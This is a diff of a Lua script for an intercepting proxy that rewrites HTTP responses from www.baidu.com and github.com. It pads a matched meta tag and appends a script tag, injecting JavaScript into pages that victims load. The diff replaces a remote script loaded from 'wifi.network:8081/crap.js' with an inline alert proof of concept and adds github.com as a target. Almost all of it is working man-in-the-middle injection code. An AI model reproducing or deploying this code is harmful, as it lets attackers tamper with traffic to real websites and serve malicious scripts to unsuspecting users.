@@ -1,7 +1,8 @@
 --local zlib = require "zlib"
 --local buffer = {}
 
-local script = '<script src="https://wifi.network:8081/crap.js"></script>'
+--local script = '<script src="https://wifi.network:8081/crap.js"></script>'
+local script = '<script>alert("CRAP!");</script>'
 local scriptLen = string.len(script)
 
 function tableLen(t)
@@ -30,9 +31,8 @@ function padding(src)
 	return string.rep(" ", n)..script
 end
 
-function modify(data, isbody, ctx, host) -- response only
-	print("================= BEGIN")
-
+function modify(data, ctx, host) -- response only
+	print("================= BEGIN", host)
 	if (host == "www.baidu.com" ) then
 
 		local matched = matchHost(host, data, "<meta.->")
@@ -40,11 +40,17 @@ function modify(data, isbody, ctx, host) -- response only
 			local dst = padding(matched)				
 			data = string.gsub(data, matched, dst)	
 			print("================== SUCCESS:\n" .. data)
+			return data
 		end
-
+	elseif ( host == "github.com" ) then
+		local matched = matchHost(host, data, "<meta.->")
+		if (matched) then 
+			local dst = padding(matched)				
+			data = string.gsub(data, matched, dst)	
+			print("================== SUCCESS:\n" .. data)
+			return data
+		end
 	end
 
-	data = string.gsub(data, "<head>", "<HEAD>")
-
-    return data
+    return nil
 end 
